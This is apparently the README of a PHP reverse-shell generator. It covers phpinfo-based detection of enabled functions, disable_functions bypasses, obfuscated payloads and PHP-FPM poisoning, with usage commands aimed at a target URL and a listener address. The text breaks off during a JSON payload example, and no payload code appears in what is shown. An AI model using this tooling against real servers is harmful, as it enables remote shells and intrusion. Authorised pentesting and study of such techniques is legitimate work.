# php-rs-analyzer  

╭── php-rs-analyzer ─────────────────────────╮  
│   reverse-shell • bypass • detection       │  
╰────────────────────────────────────────────╯  

A modern and powerful **PHP reverse shell analyzer** used to detect  
which PHP command-execution functions are available on a target system  
and to automatically generate fully working reverse-shell payloads —  
including obfuscation, PHP-FPM socket poisoning, and multiple bypass methods.

This tool is designed to solve real-world problems such as:

- **proc_open reverse shell generation**
- **disable_functions bypass**  
- **reverse shell without system(), exec(), shell_exec()**
- **detecting usable command-execution functions via phpinfo()**
- **PHP-FPM poisoning reverse shell**
- **webshell and RCE fallback techniques**

It is one of the most comprehensive utilities for attacking hardened PHP configurations.

---

# 🔎 Why this tool ranks for:  
### ** reverse shell • disable_functions bypass • php reverse shell generator**

Most pentesters search for:

- *“How do I get a reverse shell if system() is disabled?”*  
- *“proc_open reverse shell example”*  
- *“disable_functions bypass phpinfo”*  
- *“php reverse shell without exec()”*  

**php-rs-analyzer automatically answers all of these.**

By embedding these keywords into the documentation, this repository becomes highly visible for search engines — making it easier for testers, OSCP students, and red teamers to discover.

---

# 🚀 Features

- 🔍 **disable_functions extraction from phpinfo()**
- 🧠 **Reverse-shell method scoring**
- 🎯 **Best-method reverse shell recommendation**
- 🎭 **Payload obfuscation (Base64)**
- 🧩 **JSON payload engine for adding custom techniques**
- ⚙️ **Custom HTTP headers, proxy, and authentication**
- 💥 **PHP-FPM socket poisoning detection & payload generation**
- 📤 **Export payloads directly to a file**
- ✨ **Automatic GitHub update checker**
- 💤 **Silent mode (`--no-banner`)**
- 📘 **Man page included**

---

# 🔥 Supported Reverse-Shell Methods (auto-selected)

The tool evaluates which functions are blocked and generates working payloads for:

- `proc_open()` — *best fallback when system() is disabled*  
- `popen()`  
- `system()`  
- `exec()`  
- `shell_exec()`  
- `passthru()`  
- `fsockopen()` (interactive reverse shell)  
- `stream_socket_client()`  
- PHP-FPM socket poisoning (UNIX socket injection)

If **proc_open is available, the tool will automatically generate a fully working proc_open reverse shell**, which is one of the strongest PHP payloads against hardened servers.

---

# 📸 Sample Payload Output  

![Output](https://github.com/echoosso/php-rs-analyzer/blob/main/screenshots/sample-output.png)

---

# 🛠 Installation

### Install via pip

```
pip install php-rs-analyzer
```

### Install from source

```
git clone https://github.com/echoosso/php-rs-analyzer.git
cd php-rs-analyzer
pip install -r requirements.txt
```

---

# 🧪 Usage Examples

### Best available reverse-shell method (auto-selected)

```
php-rs-analyzer --url http://target/info.php \
                --lhost 10.10.14.5 \
                --lport 4444
```

### List *all* usable payloads

```
php-rs-analyzer --file phpinfo.html --mode all
```

### Use custom headers + proxy

```
php-rs-analyzer --url http://target/info \
                --header "Cookie: admin=1" \
                --proxy http://127.0.0.1:8080
```

### Export payloads

```
php-rs-analyzer --export payloads.php
```

### Generate obfuscated (Base64) payloads

```
php-rs-analyzer --obfuscate
```

---

# 🧩 JSON Payload Engine

You can extend payloads without editing Python code.

Example:

```json
[
  {
    "id": "custom_system_shell",
    "name": "Custom system() she
